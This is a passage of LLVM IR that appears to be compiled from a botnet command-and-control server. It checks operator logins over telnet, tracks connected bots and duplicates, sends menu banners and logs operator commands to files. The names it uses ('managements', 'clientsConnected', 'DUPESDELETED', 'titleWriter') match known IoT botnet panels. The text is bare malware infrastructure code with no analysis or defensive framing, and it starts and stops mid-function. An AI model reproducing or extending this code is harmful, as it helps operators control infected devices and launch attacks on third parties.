  br i1 %87, label %88, label %89

88:                                               ; preds = %79
  br label %638

89:                                               ; preds = %79
  %90 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %91 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %90, i8* noundef getelementptr inbounds ([25 x i8], [25 x i8]* @.str.21, i64 0, i64 0)) #9
  %92 = load i32, i32* %4, align 4
  %93 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %94 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %95 = call i64 @strlen(i8* noundef %94) #8
  %96 = call i64 @send(i32 noundef %92, i8* noundef %93, i64 noundef %95, i32 noundef 16384)
  %97 = icmp eq i64 %96, -1
  br i1 %97, label %98, label %99

98:                                               ; preds = %89
  br label %638

99:                                               ; preds = %89
  %100 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %101 = load i32, i32* %4, align 4
  %102 = call i32 @fdgets(i8* noundef %100, i32 noundef 2048, i32 noundef %101)
  %103 = icmp slt i32 %102, 1
  br i1 %103, label %104, label %105

104:                                              ; preds = %99
  br label %638

105:                                              ; preds = %99
  %106 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @trim(i8* noundef %106)
  %107 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i64 0, i64 0
  %108 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %109 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %107, i8* noundef %108) #9
  %110 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  store i8* %110, i8** %9, align 8
  %111 = load i8*, i8** %9, align 8
  %112 = call i32 @Search_in_File(i8* noundef %111)
  store i32 %112, i32* %5, align 4
  %113 = load i8*, i8** %9, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %115
  %117 = getelementptr inbounds %struct.account, %struct.account* %116, i32 0, i32 0
  %118 = getelementptr inbounds [20 x i8], [20 x i8]* %117, i64 0, i64 0
  %119 = call i32 @strcmp(i8* noundef %113, i8* noundef %118) #8
  %120 = icmp eq i32 %119, 0
  br i1 %120, label %121, label %150

121:                                              ; preds = %105
  %122 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %123 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %122, i8* noundef getelementptr inbounds ([32 x i8], [32 x i8]* @.str.23, i64 0, i64 0)) #9
  %124 = load i32, i32* %4, align 4
  %125 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %126 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %127 = call i64 @strlen(i8* noundef %126) #8
  %128 = call i64 @send(i32 noundef %124, i8* noundef %125, i64 noundef %127, i32 noundef 16384)
  %129 = icmp eq i64 %128, -1
  br i1 %129, label %130, label %131

130:                                              ; preds = %121
  br label %638

131:                                              ; preds = %121
  %132 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %133 = load i32, i32* %4, align 4
  %134 = call i32 @fdgets(i8* noundef %132, i32 noundef 2048, i32 noundef %133)
  %135 = icmp slt i32 %134, 1
  br i1 %135, label %136, label %137

136:                                              ; preds = %131
  br label %638

137:                                              ; preds = %131
  %138 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @trim(i8* noundef %138)
  %139 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %140 = load i32, i32* %5, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %141
  %143 = getelementptr inbounds %struct.account, %struct.account* %142, i32 0, i32 1
  %144 = getelementptr inbounds [20 x i8], [20 x i8]* %143, i64 0, i64 0
  %145 = call i32 @strcmp(i8* noundef %139, i8* noundef %144) #8
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %147, label %148

147:                                              ; preds = %137
  br label %151

148:                                              ; preds = %137
  %149 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %149, i8 0, i64 2048, i1 false)
  br label %157

150:                                              ; preds = %105
  br label %151

151:                                              ; preds = %150, %147
  %152 = load i32, i32* %4, align 4
  %153 = call i64 @send(i32 noundef %152, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i64 0, i64 0), i64 noundef 5, i32 noundef 16384)
  %154 = icmp eq i64 %153, -1
  br i1 %154, label %155, label %156

155:                                              ; preds = %151
  br label %638

156:                                              ; preds = %151
  br label %638

157:                                              ; preds = %148
  %158 = load i8*, i8** %3, align 8
  %159 = call i32 @pthread_create(i64* noundef %6, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @titleWriter, i8* noundef %158) #9
  %160 = load i32, i32* %4, align 4
  %161 = call i64 @send(i32 noundef %160, i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.25, i64 0, i64 0), i64 noundef 14, i32 noundef 16384)
  %162 = icmp eq i64 %161, -1
  br i1 %162, label %163, label %164

163:                                              ; preds = %157
  br label %638

164:                                              ; preds = %157
  %165 = load i32, i32* %4, align 4
  %166 = call i64 @send(i32 noundef %165, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.26, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %167 = icmp eq i64 %166, -1
  br i1 %167, label %168, label %169

168:                                              ; preds = %164
  br label %638

169:                                              ; preds = %164
  %170 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %171 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %170, i8* noundef getelementptr inbounds ([216 x i8], [216 x i8]* @.str.27, i64 0, i64 0)) #9
  %172 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %173 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %172, i8* noundef getelementptr inbounds ([258 x i8], [258 x i8]* @.str.28, i64 0, i64 0)) #9
  %174 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %175 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %174, i8* noundef getelementptr inbounds ([240 x i8], [240 x i8]* @.str.29, i64 0, i64 0)) #9
  %176 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %177 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %176, i8* noundef getelementptr inbounds ([268 x i8], [268 x i8]* @.str.30, i64 0, i64 0)) #9
  %178 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %179 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %178, i8* noundef getelementptr inbounds ([243 x i8], [243 x i8]* @.str.31, i64 0, i64 0)) #9
  %180 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %181 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %180, i8* noundef getelementptr inbounds ([121 x i8], [121 x i8]* @.str.32, i64 0, i64 0)) #9
  %182 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %183 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %182, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.26, i64 0, i64 0)) #9
  %184 = load i32, i32* %4, align 4
  %185 = call i64 @send(i32 noundef %184, i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.25, i64 0, i64 0), i64 noundef 14, i32 noundef 16384)
  %186 = icmp eq i64 %185, -1
  br i1 %186, label %187, label %188

187:                                              ; preds = %169
  br label %638

188:                                              ; preds = %169
  %189 = load i32, i32* %4, align 4
  %190 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %191 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %192 = call i64 @strlen(i8* noundef %191) #8
  %193 = call i64 @send(i32 noundef %189, i8* noundef %190, i64 noundef %192, i32 noundef 16384)
  %194 = icmp eq i64 %193, -1
  br i1 %194, label %195, label %196

195:                                              ; preds = %188
  br label %638

196:                                              ; preds = %188
  %197 = load i32, i32* %4, align 4
  %198 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %199 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %200 = call i64 @strlen(i8* noundef %199) #8
  %201 = call i64 @send(i32 noundef %197, i8* noundef %198, i64 noundef %200, i32 noundef 16384)
  %202 = icmp eq i64 %201, -1
  br i1 %202, label %203, label %204

203:                                              ; preds = %196
  br label %638

204:                                              ; preds = %196
  %205 = load i32, i32* %4, align 4
  %206 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %207 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %208 = call i64 @strlen(i8* noundef %207) #8
  %209 = call i64 @send(i32 noundef %205, i8* noundef %206, i64 noundef %208, i32 noundef 16384)
  %210 = icmp eq i64 %209, -1
  br i1 %210, label %211, label %212

211:                                              ; preds = %204
  br label %638

212:                                              ; preds = %204
  %213 = load i32, i32* %4, align 4
  %214 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %215 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %216 = call i64 @strlen(i8* noundef %215) #8
  %217 = call i64 @send(i32 noundef %213, i8* noundef %214, i64 noundef %216, i32 noundef 16384)
  %218 = icmp eq i64 %217, -1
  br i1 %218, label %219, label %220

219:                                              ; preds = %212
  br label %638

220:                                              ; preds = %212
  %221 = load i32, i32* %4, align 4
  %222 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %223 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %224 = call i64 @strlen(i8* noundef %223) #8
  %225 = call i64 @send(i32 noundef %221, i8* noundef %222, i64 noundef %224, i32 noundef 16384)
  %226 = icmp eq i64 %225, -1
  br i1 %226, label %227, label %228

227:                                              ; preds = %220
  br label %638

228:                                              ; preds = %220
  %229 = load i32, i32* %4, align 4
  %230 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %231 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %232 = call i64 @strlen(i8* noundef %231) #8
  %233 = call i64 @send(i32 noundef %229, i8* noundef %230, i64 noundef %232, i32 noundef 16384)
  %234 = icmp eq i64 %233, -1
  br i1 %234, label %235, label %236

235:                                              ; preds = %228
  br label %638

236:                                              ; preds = %228
  %237 = load i32, i32* %4, align 4
  %238 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %239 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %240 = call i64 @strlen(i8* noundef %239) #8
  %241 = call i64 @send(i32 noundef %237, i8* noundef %238, i64 noundef %240, i32 noundef 16384)
  %242 = icmp eq i64 %241, -1
  br i1 %242, label %243, label %244

243:                                              ; preds = %236
  br label %638

244:                                              ; preds = %236
  br label %245

245:                                              ; preds = %244
  %246 = load i32, i32* %4, align 4
  %247 = call i64 @send(i32 noundef %246, i8* noundef getelementptr inbounds ([45 x i8], [45 x i8]* @.str.33, i64 0, i64 0), i64 noundef 45, i32 noundef 16384)
  %248 = icmp eq i64 %247, -1
  br i1 %248, label %249, label %250

249:                                              ; preds = %245
  br label %638

250:                                              ; preds = %245
  br label %251

251:                                              ; preds = %250
  %252 = load i8*, i8** %3, align 8
  %253 = call i32 @pthread_create(i64* noundef %6, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @titleWriter, i8* noundef %252) #9
  %254 = load i32, i32* %4, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %255
  %257 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %256, i32 0, i32 1
  store i32 1, i32* %257, align 4
  br label %258

258:                                              ; preds = %614, %613, %346, %251
  %259 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %260 = load i32, i32* %4, align 4
  %261 = call i32 @fdgets(i8* noundef %259, i32 noundef 2048, i32 noundef %260)
  %262 = icmp sgt i32 %261, 0
  br i1 %262, label %263, label %637

263:                                              ; preds = %258
  %264 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %265 = call i8* @strstr(i8* noundef %264, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0)) #8
  %266 = icmp ne i8* %265, null
  br i1 %266, label %267, label %281

267:                                              ; preds = %263
  %268 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %269 = call i32 @clientsConnected()
  %270 = load volatile i32, i32* @managesConnected, align 4
  %271 = load volatile i32, i32* @DUPESDELETED, align 4
  %272 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %268, i8* noundef getelementptr inbounds ([26 x i8], [26 x i8]* @.str.35, i64 0, i64 0), i32 noundef %269, i32 noundef %270, i32 noundef %271) #9
  %273 = load i32, i32* %4, align 4
  %274 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %275 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %276 = call i64 @strlen(i8* noundef %275) #8
  %277 = call i64 @send(i32 noundef %273, i8* noundef %274, i64 noundef %276, i32 noundef 16384)
  %278 = icmp eq i64 %277, -1
  br i1 %278, label %279, label %280

279:                                              ; preds = %267
  br label %280

280:                                              ; preds = %279, %267
  br label %281

281:                                              ; preds = %280, %263
  %282 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %283 = call i8* @strstr(i8* noundef %282, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0)) #8
  %284 = icmp ne i8* %283, null
  br i1 %284, label %285, label %347

285:                                              ; preds = %281
  %286 = load i8*, i8** %3, align 8
  %287 = call i32 @pthread_create(i64* noundef %6, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @titleWriter, i8* noundef %286) #9
  %288 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %289 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %288, i8* noundef getelementptr inbounds ([60 x i8], [60 x i8]* @.str.37, i64 0, i64 0)) #9
  %290 = getelementptr inbounds [80 x i8], [80 x i8]* %27, i64 0, i64 0
  %291 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %290, i8* noundef getelementptr inbounds ([48 x i8], [48 x i8]* @.str.38, i64 0, i64 0)) #9
  %292 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i64 0, i64 0
  %293 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %292, i8* noundef getelementptr inbounds ([63 x i8], [63 x i8]* @.str.39, i64 0, i64 0)) #9
  %294 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i64 0, i64 0
  %295 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %294, i8* noundef getelementptr inbounds ([54 x i8], [54 x i8]* @.str.40, i64 0, i64 0)) #9
  %296 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i64 0, i64 0
  %297 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %296, i8* noundef getelementptr inbounds ([38 x i8], [38 x i8]* @.str.41, i64 0, i64 0)) #9
  %298 = load i32, i32* %4, align 4
  %299 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %300 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %301 = call i64 @strlen(i8* noundef %300) #8
  %302 = call i64 @send(i32 noundef %298, i8* noundef %299, i64 noundef %301, i32 noundef 16384)
  %303 = icmp eq i64 %302, -1
  br i1 %303, label %304, label %305

304:                                              ; preds = %285
  br label %638

305:                                              ; preds = %285
  %306 = load i32, i32* %4, align 4
  %307 = getelementptr inbounds [80 x i8], [80 x i8]* %27, i64 0, i64 0
  %308 = getelementptr inbounds [80 x i8], [80 x i8]* %27, i64 0, i64 0
  %309 = call i64 @strlen(i8* noundef %308) #8
  %310 = call i64 @send(i32 noundef %306, i8* noundef %307, i64 noundef %309, i32 noundef 16384)
  %311 = icmp eq i64 %310, -1
  br i1 %311, label %312, label %313

312:                                              ; preds = %305
  br label %638

313:                                              ; preds = %305
  %314 = load i32, i32* %4, align 4
  %315 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i64 0, i64 0
  %316 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i64 0, i64 0
  %317 = call i64 @strlen(i8* noundef %316) #8
  %318 = call i64 @send(i32 noundef %314, i8* noundef %315, i64 noundef %317, i32 noundef 16384)
  %319 = icmp eq i64 %318, -1
  br i1 %319, label %320, label %321

320:                                              ; preds = %313
  br label %638

321:                                              ; preds = %313
  %322 = load i32, i32* %4, align 4
  %323 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i64 0, i64 0
  %324 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i64 0, i64 0
  %325 = call i64 @strlen(i8* noundef %324) #8
  %326 = call i64 @send(i32 noundef %322, i8* noundef %323, i64 noundef %325, i32 noundef 16384)
  %327 = icmp eq i64 %326, -1
  br i1 %327, label %328, label %329

328:                                              ; preds = %321
  br label %638

329:                                              ; preds = %321
  %330 = load i32, i32* %4, align 4
  %331 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i64 0, i64 0
  %332 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i64 0, i64 0
  %333 = call i64 @strlen(i8* noundef %332) #8
  %334 = call i64 @send(i32 noundef %330, i8* noundef %331, i64 noundef %333, i32 noundef 16384)
  %335 = icmp eq i64 %334, -1
  br i1 %335, label %336, label %337

336:                                              ; preds = %329
  br label %638

337:                                              ; preds = %329
  %338 = load i8*, i8** %3, align 8
  %339 = call i32 @pthread_create(i64* noundef %6, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @titleWriter, i8* noundef %338) #9
  br label %340

340:                                              ; preds = %337
  %341 = load i32, i32* %4, align 4
  %342 = call i64 @send(i32 noundef %341, i8* noundef getelementptr inbounds ([45 x i8], [45 x i8]* @.str.33, i64 0, i64 0), i64 noundef 44, i32 noundef 16384)
  %343 = icmp eq i64 %342, -1
  br i1 %343, label %344, label %345

344:                                              ; preds = %340
  br label %638

345:                                              ; preds = %340
  br label %346

346:                                              ; preds = %345
  br label %258, !llvm.loop !19

347:                                              ; preds = %281
  %348 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %349 = call i8* @strstr(i8* noundef %348, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.42, i64 0, i64 0)) #8
  %350 = icmp ne i8* %349, null
  br i1 %350, label %351, label %370

351:                                              ; preds = %347
  %352 = load i32, i32* %5, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %353
  %355 = getelementptr inbounds %struct.account, %struct.account* %354, i32 0, i32 0
  %356 = getelementptr inbounds [20 x i8], [20 x i8]* %355, i64 0, i64 0
  %357 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %358 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([28 x i8], [28 x i8]* @.str.43, i64 0, i64 0), i8* noundef %356, i8* noundef %357)
  %359 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i64 0, i64 0))
  store %struct._IO_FILE* %359, %struct._IO_FILE** %31, align 8
  %360 = load %struct._IO_FILE*, %struct._IO_FILE** %31, align 8
  %361 = load i32, i32* %5, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %362
  %364 = getelementptr inbounds %struct.account, %struct.account* %363, i32 0, i32 0
  %365 = getelementptr inbounds [20 x i8], [20 x i8]* %364, i64 0, i64 0
  %366 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %367 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %360, i8* noundef getelementptr inbounds ([28 x i8], [28 x i8]* @.str.43, i64 0, i64 0), i8* noundef %365, i8* noundef %366)
  %368 = load %struct._IO_FILE*, %struct._IO_FILE** %31, align 8
  %369 = call i32 @fclose(%struct._IO_FILE* noundef %368)
  br label %638

370:                                              ; preds = %347
  %371 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %372 = call i8* @strstr(i8* noundef %371, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.45, i64 0, i64 0)) #8
  %373 = icmp ne i8* %372, null
  br i1 %373, label %374, label %393

374:                                              ; preds = %370
  %375 = load i32, i32* %5, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %376
  %378 = getelementptr inbounds %struct.account, %struct.account* %377, i32 0, i32 0
  %379 = getelementptr inbounds [20 x i8], [20 x i8]* %378, i64 0, i64 0
  %380 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %381 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([28 x i8], [28 x i8]* @.str.43, i64 0, i64 0), i8* noundef %379, i8* noundef %380)
  %382 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i64 0, i64 0))
  store %struct._IO_FILE* %382, %struct._IO_FILE** %32, align 8
  %383 = load %struct._IO_FILE*, %struct._IO_FILE** %32, align 8
  %384 = load i32, i32* %5, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %385
  %387 = getelementptr inbounds %struct.account, %struct.account* %386, i32 0, i32 0
  %388 = getelementptr inbounds [20 x i8], [20 x i8]* %387, i64 0, i64 0
  %389 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %390 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %383, i8* noundef getelementptr inbounds ([28 x i8], [28 x i8]* @.str.43, i64 0, i64 0), i8* noundef %388, i8* noundef %389)
  %391 = load %struct._IO_FILE*, %struct._IO_FILE** %32, align 8
  %392 = call i32 @fclose(%struct._IO_FILE* noundef %391)
  br label %638

393:                                              ; preds = %370
  %394 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %395 = call i8* @strstr(i8* noundef %394, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.45, i64 0, i64 0)) #8
  %396 = icmp ne i8* %395, null
  br i1 %396, label %397, label %416

397:                                              ; preds = %393
  %398 = load i32, i32* %5, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %399
  %401 = getelementptr inbounds %struct.account, %struct.account* %400, i32 0, i32 0
  %402 = getelementptr inbounds [20 x i8], [20 x i8]* %401, i64 0, i64 0
  %403 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %404 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([28 x i8], [28 x i8]* @.str.43, i64 0, i64 0), i8* noundef %402, i8* noundef %403)
  %405 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i64 0, i64 0))
  store %struct._IO_FILE* %405, %struct._IO_FILE** %33, align 8
  %406 = load %struct._IO_FILE*, %struct._IO_FILE** %33, align 8
  %407 = load i32, i32* %5, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %408
  %410 = getelementptr inbounds %struct.account, %struct.account* %409, i32 0, i32 0
  %411 = getelementptr inbounds [20 x i8], [20 x i8]* %410, i64 0, i64 0
  %412 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %413 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %406, i8* noundef getelementptr inbounds ([28 x i8], [28 x i8]* @.str.43, i64 0, i64 0), i8* noundef %411, i8* noundef %412)
  %414 = load %struct._IO_FILE*, %struct._IO_FILE** %33, align 8
  %415 = call i32 @fclose(%struct._IO_FILE* noundef %414)
  br label %638

416:                                              ; preds = %393
  %417 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %418 = call i8* @strstr(i8* noundef %417, i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.46, i64 0, i64 0)) #8
  %419 = icmp ne i8* %418, null
  br i1 %419, label %420, label %439

420:                                              ; preds = %416
  %421 = load i32, i32* %5, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %422
  %424 = getelementptr inbounds %struct.account, %struct.account* %423, i32 0, i32 0
  %425 = getelementptr inbounds [20 x i8], [20 x i8]* %424, i64 0, i64 0
  %426 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %427 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.47, i64 0, i64 0), i8* noundef %425, i8* noundef %426)
  %428 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.48, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i64 0, i64 0))
  store %struct._IO_FILE* %428, %struct._IO_FILE** %34, align 8
  %429 = load %struct._IO_FILE*, %struct._IO_FILE** %34, align 8
  %430 = load i32, i32* %5, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %431
  %433 = getelementptr inbounds %struct.account, %struct.account* %432, i32 0, i32 0
  %434 = getelementptr inbounds [20 x i8], [20 x i8]* %433, i64 0, i64 0
  %435 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %436 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %429, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.47, i64 0, i64 0), i8* noundef %434, i8* noundef %435)
  %437 = load %struct._IO_FILE*, %struct._IO_FILE** %34, align 8
  %438 = call i32 @fclose(%struct._IO_FILE* noundef %437)
  br label %638

439:                                              ; preds = %416
  %440 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %441 = call i8* @strstr(i8* noundef %440, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.49, i64 0, i64 0)) #8
  %442 = icmp ne i8* %441, null
  br i1 %442, label %443, label %462

443:                                              ; preds = %439
  %444 = load i32, i32* %5, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %445
  %447 = getelementptr inbounds %struct.account, %struct.account* %446, i32 0, i32 0
  %448 = getelementptr inbounds [20 x i8], [20 x i8]* %447, i64 0, i64 0
  %449 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %450 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([33 x i8], [33 x i8]* @.str.50, i64 0, i64 0), i8* noundef %448, i8* noundef %449)
  %451 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.51, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i64 0, i64 0))
  store %struct._IO_FILE* %451, %struct._IO_FILE** %35, align 8
  %452 = load %struct._IO_FILE*, %struct._IO_FILE** %35, align 8
  %453 = load i32, i32* %5, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %454
  %456 = getelementptr inbounds %struct.account, %struct.account* %455, i32 0, i32 0
  %457 = getelementptr inbounds [20 x i8], [20 x i8]* %456, i64 0, i64 0
  %458 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %459 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %452, i8* noundef getelementptr inbounds ([25 x i8], [25 x i8]* @.str.52, i64 0, i64 0), i8* noundef %457, i8* noundef %458)
  %460 = load %struct._IO_FILE*, %struct._IO_FILE** %35, align 8
  %461 = call i32 @fclose(%struct._IO_FILE* noundef %460)
  br label %638

462:                                              ; preds = %439
  %463 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %464 = call i8* @strstr(i8* noundef %463, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.53, i64 0, i64 0)) #8
